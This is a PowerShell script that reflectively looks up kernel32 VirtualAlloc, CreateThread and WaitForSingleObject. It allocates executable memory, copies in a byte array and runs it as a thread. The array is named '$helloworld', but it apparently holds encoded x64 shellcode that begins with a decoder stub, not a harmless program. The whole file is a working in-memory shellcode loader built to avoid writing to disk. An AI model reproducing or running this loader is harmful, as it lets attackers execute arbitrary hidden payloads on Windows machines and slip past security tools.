function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
    Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
    @($moduleName)), $functionName))
}

function getDelegateType {
    Param (
    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
    [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
    [System.MulticastDelegate])
    $type.
    DefineConstructor('RTSpecialName, HideBySig, Public',
    [System.Reflection.CallingConventions]::Standard, $func).
    SetImplementationFlags('Runtime, Managed')
    $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
    SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

# Allocate executable memory
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), 
  (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $helloworld = 0x54,0xdd,0xc2,0x41,0x59,0x48,0x31,0xff,0x40,0xb7,0x40,0x66,0x41,0x81,0xe1,0x80,0xf6,0x49,0xf,0xae,0x1,0x48,0xba,0xcb,0x13,0xb6,0xae,0xdc,0x49,0xbb,0x61,0x49,0x8b,0x49,0x8,0x48,0xff,0xcf,0x48,0x31,0x54,0xf9,0x2f,0x48,0x85,0xff,0x75,0xf3,0x37,0x5b,0x35,0x4a,0x2c,0xa1,0x77,0x61,0xcb,0x13,0xf7,0xff,0x9d,0x19,0xe9,0x30,0x9d,0x5b,0x87,0x7c,0xb9,0x1,0x30,0x33,0xab,0x5b,0x3d,0xfc,0xc4,0x1,0x30,0x33,0xeb,0x5b,0x3d,0xdc,0x8c,0x4,0x8a,0xa8,0x83,0x1c,0x1,0xe4,0x96,0x1,0x8a,0xa1,0x67,0x2f,0xd7,0xd2,0xde,0x65,0x9b,0x20,0xa,0xda,0xbb,0xef,0xdd,0x88,0x59,0x8c,0x99,0x5b,0x3d,0xfc,0xfc,0x8,0xea,0xea,0x89,0x2f,0xfe,0xaf,0xc,0x2f,0x3a,0x19,0xd3,0x18,0xb4,0xa1,0x59,0x3b,0xbb,0x61,0xcb,0x98,0x36,0x26,0xdc,0x49,0xbb,0x29,0x4e,0xd3,0xc2,0xc9,0x94,0x48,0x6b,0x25,0x40,0x53,0x96,0xfe,0x95,0x48,0x6b,0xea,0x83,0xb,0x55,0xf8,0x94,0xb6,0x72,0x2c,0xfa,0xda,0xf7,0x25,0xe8,0xc1,0xf3,0x60,0x1d,0x5b,0x87,0x6e,0x70,0x8,0x7a,0xa8,0xc6,0x52,0xb7,0x6f,0xe4,0xa9,0xce,0x90,0x87,0x10,0xfa,0x8a,0xd4,0xc,0x82,0xb0,0xbe,0xcb,0xee,0xea,0x57,0x9,0x9f,0x28,0xca,0xc3,0xd0,0xef,0x57,0x45,0xf3,0x25,0x40,0x53,0xaa,0xe7,0xdd,0x99,0xfa,0xea,0xcf,0x9b,0xf7,0xf6,0x9d,0x11,0xe5,0x29,0xca,0xc3,0xef,0xf4,0x9d,0x11,0xfa,0x38,0x8a,0x49,0xfe,0x2d,0x30,0x69,0xfa,0x33,0x34,0xf3,0xee,0xef,0x85,0x13,0xf3,0xea,0xd9,0xfa,0xfd,0x51,0x23,0xb6,0xe6,0x28,0x75,0x64,0xc5,0x9c,0x83,0x7a,0x89,0x61,0xcb,0x52,0xe0,0xe7,0x55,0xaf,0xf3,0xe0,0x27,0xb3,0xb7,0xae,0xdc,0x0,0x32,0x84,0x82,0xaf,0xb4,0xae,0xdd,0xf2,0xf4,0x14,0xd3,0xa2,0xf7,0xfa,0x95,0xc0,0x5f,0x2d,0x42,0xe2,0xf7,0x14,0x90,0x3e,0x9d,0x66,0x34,0xc6,0xfa,0x27,0x36,0x21,0xba,0x60,0xcb,0x13,0xef,0xef,0x66,0x60,0x3b,0xa,0xcb,0xec,0x63,0xc4,0xd6,0x8,0xe5,0x31,0x9b,0x5e,0x87,0x67,0x91,0x78,0x7b,0x29,0x34,0xd3,0xfe,0x27,0x1e,0x1,0x44,0xa1,0x83,0x9a,0x77,0xef,0x66,0xa3,0xb4,0xbe,0x2b,0xec,0x63,0xe6,0x55,0x8e,0xd1,0x71,0x8a,0x4b,0xfa,0x27,0x3e,0x1,0x32,0x98,0x8a,0xa9,0x2f,0xb,0xa8,0x28,0x44,0xb4,0x4e,0xd3,0xc2,0xa4,0x95,0xb6,0x75,0x14,0x2e,0xfb,0x25,0xae,0xdc,0x49,0xf3,0xe2,0x27,0x3,0xfe,0x27,0x3e,0x4,0x8a,0xa8,0xa1,0x17,0xf7,0xf6,0x94,0xc0,0x42,0x20,0x71,0x11,0x6f,0x66,0x83,0xb6,0x6e,0xe2,0x33,0x13,0xc8,0xfb,0x94,0xca,0x7f,0x41,0x95,0x9a,0x40,0xc4,0x9c,0x8,0xe2,0x9,0xcb,0x3,0xb6,0xae,0x9d,0x11,0xf3,0xe8,0x39,0x5b,0x87,0x67,0x9d,0xf3,0xe3,0xc5,0x98,0xf6,0x49,0x7b,0x94,0xc0,0x78,0x28,0x42,0xd4,0xfb,0x9f,0x15,0x0,0x32,0x91,0x83,0x9a,0x6c,0xe6,0x55,0xb0,0xfa,0xdb,0xc9,0xca,0x7e,0xf1,0x23,0x9c,0x38,0x99,0xcb,0x6e,0x9e,0xf6,0x9d,0x1e,0xe2,0x9,0xcb,0x53,0xb6,0xae,0x9d,0x11,0xd1,0x61,0x91,0x52,0xc,0xa5,0xf3,0x46,0x8b,0x9e,0x1e,0x44,0xef,0xef,0x66,0x3c,0xd5,0x2c,0xaa,0xec,0x63,0xe7,0x23,0x87,0x52,0x5d,0x34,0xec,0x49,0xe6,0xdd,0x8a,0xf3,0x48,0xd,0x5b,0x33,0x58,0xa9,0xfd,0xfa,0x9e,0x2c,0x4b,0xdc,0xae,0x85,0xf2,0x5b,0x7c,0xe1,0x19,0xf7,0x27,0x6,0xb6,0x6e,0xfe


[System.Runtime.InteropServices.Marshal]::Copy($helloworld, 0, $lpMem, $helloworld.length)

# Execute shellcode and wait for it to exit
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread),
  (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject),
  (getDelegateType @([IntPtr], [Int32])([Int]))).Invoke($hThread, 0xFFFFFFFF)
